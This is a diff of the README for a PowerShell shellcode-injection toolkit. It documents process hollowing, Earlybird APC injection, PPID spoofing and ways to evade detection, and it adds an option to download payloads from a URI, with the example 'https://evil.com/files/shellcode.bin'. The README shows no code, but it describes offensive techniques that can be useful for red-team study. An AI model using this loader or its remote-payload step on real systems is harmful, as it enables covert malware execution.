@@ -14,18 +14,18 @@ ShellcodeLoaderPS/
 |
 |__ helpers/
 |   |__ win32-examples/*         # Contains examples of Win32 API usage via helper functions (e.g., `CreateProcessA().ps1`).
-|   |__ Build-Win32Struct.ps1    # Defines .NET data structs within the session usable by Win32 functions.
-|   |__ Format-ByteArray.ps1     # Converts shellcode strings in different languages to usable byte arrays.
 |   |__ Load-Win32Function.ps1   # Dynamically resolves and loads Win32 API functions into session via delegates.
+|   |__ Build-Win32Struct.ps1    # Defines .NET data structs within the session usable by Win32 functions.
+|   |__ Format-ByteArray.ps1     # Converts multi-language shellcode formats into usable byte arrays.
 |
 |__ standalone/
-|   |__ add-type/*               # Standalone function(s) for shellcode injection using `Add-Type`.
-|   |__ win32/*                  # Standalone function(s) for shellcode injection using Win32 API via helper functions.
-|   |__ native/*                 # Standalone function(s) for shellcode injection using Native API via helper functions.
+|   |__ add-type/*               # Simple standalone function(s) for shellcode injection using `Add-Type`.
+|   |__ win32/*                  # Advanced standalone function(s) for shellcode injection using function pointer delegates.
 |
-|__ Load-Shellcode.ps1           # Main shellcode injector function, wrapping functionality of standalone functions.
+|__ Load-Shellcode.ps1           # Monolithic shellcode injection script that wraps the advanced standalone scripts.
 |__ calc32.bin                   # Example 32-bit `calc.exe` shellcode generated from `msfvenom` used for testing.
 |__ calc64.bin                   # Example 64-bit `calc.exe` shellcode generated from `msfvenom` used for testing.
+|__ msgbox64.bin                 # Example 64-bit `MessageBoxA()` shellcode used for testing.
 ```
 _(Note: this project is work-in-progress, therefore some directory structures haven't been implemented yet)_
 
@@ -42,7 +42,7 @@ _(Note: this project is work-in-progress, therefore some directory structures ha
   - **Summary:**
     - This technique avoids common (and noisy) practices such as utilizing `Add-Type` and embedded `C#`.
     - This is accomplished via custom helpers to resolve and invoke raw function pointers with .NET delegates, allowing you to invoke them without adding an entry to the IAT.
-    - Custom Scripts: [Load-Win32Function.ps1](./helpers/Load-Win32Function.ps1), [Build-Win32Struct.ps1](./helpers/Build-Win32Struct.ps1)`
+    - Custom Scripts: [Load-Win32Function.ps1](./helpers/Load-Win32Function.ps1), [Build-Win32Struct.ps1](./helpers/Build-Win32Struct.ps1)
 </details>
 
 <details>
@@ -51,6 +51,7 @@ _(Note: this project is work-in-progress, therefore some directory structures ha
   - **Summary:**
     - Inject shellcode into the current local process (i.e., `PowerShell`) using standard Win32 API calls (aka `Kernel32.dll`).
     - Skipping Native API (aka `Ntdll.dll`) due to remote process injection POC also supporting local process injection.
+    - Custom Script: [Local-ProcessInject.ps1](./standalone/win32/Local-ProcessInject.ps1)
 ```mermaid
 flowchart LR
 
@@ -73,6 +74,7 @@ end
   - **Summary:**
     - Inject shellcode into remote processes via the Win32 API (aka `Kernel32.dll`).
     - This also works for local process injection by targeting the current process' PID.
+    - Custom Script: [Remote-ProcessInject.ps1](./standalone/win32/Remote-ProcessInject.ps1)
 ```mermaid
 flowchart TD;
 
@@ -87,6 +89,34 @@ subgraph Win32 Process Injection
   PS --> | Step 4:<br>**CreateRemoteThread**<br>Execute shellcode. | Proc
 end
 ```
+</details>
+
+<details>
+  <summary><b>✅ Process Hollowing</b></summary>
+  
+  - **Summary:**
+    - Create a legitimate process in a suspended state, then replace the process' memory with malicious code before resuming execution.
+    - Custom Script: [Process-Hollow.ps1](./standalone/win32/Process-Hollow.ps1)
+    - Will add a pretty Mermaid diagram soon.
+</details>
+
+<details>
+  <summary><b>✅ APC Injection (aka Earlybird)</b></summary>
+  
+  - **Summary:**
+    - Queue shellcode execution to a thread's Asynchronous Procedure Call (APC) queue for stealthy execution.
+    - Custom Script: [Earlybird-Inject.ps1](./standalone/win32/Earlybird-Inject.ps1)
+    - Will add a pretty Mermaid diagram soon.
+</details>
+
+<details>
+  <summary><b>✅ Parent Process ID (PPID) Spoofing</b></summary>
+  
+  - **Summary:**
+    - Spoof the parent process ID when creating processes.
+    - This technique can make malicious processes appear spawned from trusted processes.
+    - Custom Script: [PPID-Spoof.ps1](./standalone/win32/PPID-Spoof.ps1)
+    - Will add a pretty Mermaid diagram soon.
 </details>
 
 <details>
@@ -112,28 +142,6 @@ end
 </details>
 
 <details>
-  <summary><b>❌ Process Hollowing</b></summary>
-  
-  - **Summary:**
-    - Create a legitimate process in a suspended state, then replace the process' memory with malicious code before resuming execution.
-</details>
-
-<details>
-  <summary><b>❌ Parent Process ID (PPID) Spoofing</b></summary>
-  
-  - **Summary:**
-    - Spoof the parent process ID when creating processes.
-    - This technique can make malicious processes appear spawned from trusted processes.
-</details>
-
-<details>
-  <summary><b>❌ APC Injection (aka Earlybird)</b></summary>
-  
-  - **Summary:**
-    - Queue shellcode execution to a thread's Asynchronous Procedure Call (APC) queue for stealthy execution.
-</details>
-
-<details>
   <summary><b>❌ Direct System Call Implementation</b></summary>
   
   - **Summary:**
@@ -144,8 +152,9 @@ end
 
 ## Load-Shellcode.ps1 Usage
 
-> Every script should hopefully be excessively documented, so plese refer to the source code for other examples.
+> Every script should hopefully be excessively documented, so please refer to the source code for other examples.
 
+_(Note: the current `Load-Shellcode.ps1` is old and worse than the standalone scripts; monolithic wrapper coming real soon)_
 ```
 Usage: Load-Shellcode [options]
 
@@ -172,17 +181,21 @@ _(Note: as of writing, only Win32-based remote process injection has been implem
 
 ### Shellcode Parsing
 
-For supported shellcode, the `-Shellcode` parameter is intentionally undeclared and written to accept most shellcode formats. Currently supports strings `[string]` and byte arrays `[byte[]]`.
-If a standard array `[array]` is used, the array will be converted to a string prior to language detection. If a byte array is used, no formatting will occur.
+The `-Shellcode` parameter is intentionally undeclared and written to accept most shellcode formats.
+Currently supports `[string]`, `[array]/[byte[]]`, and `[uri]` types.  If a standard array is used, the
+array will be converted to a string prior to language detection.  If a byte array is used, no 
+formatting will occur.  If a string is determined to be a URI, then a web request will attempt to
+download the raw bytes from the provided URI.
 
 Below is a table of supported string formats:
 
 | Format | Example |
 | --- | --- |
-| Path to Raw Shellcode | `.\shellcode.bin` |
-| Python Shellcode      | `'b"\x45\x78\x61\x6d\x70\x6c\x65"'` |
-| C Shellcode           | `'\x45\x78\x61\x6d\x70\x6c\x65'` |
-| C++ / C# Shellcode    | `'{0x45,0x78,0x61,0x70,0x6c,0x65}'` |
+| Path to Raw Shellcode | `./shellcode.bin` |
+| URI Hosting Shellcode | `https://evil.com/files/shellcode.bin` |
+| Python Shellcode      | `b"\x45\x78\x61\x6d\x70\x6c\x65"` |
+| C Shellcode           | `\x45\x78\x61\x6d\x70\x6c\x65` |
+| C++ / C# Shellcode    | `{0x45,0x78,0x61,0x70,0x6c,0x65}` |
 
 ### Architecture Support
 Works with both `Windows PowerShell` and `PowerShell Core (Pwsh)`. Using 64-bit PowerShell sessions
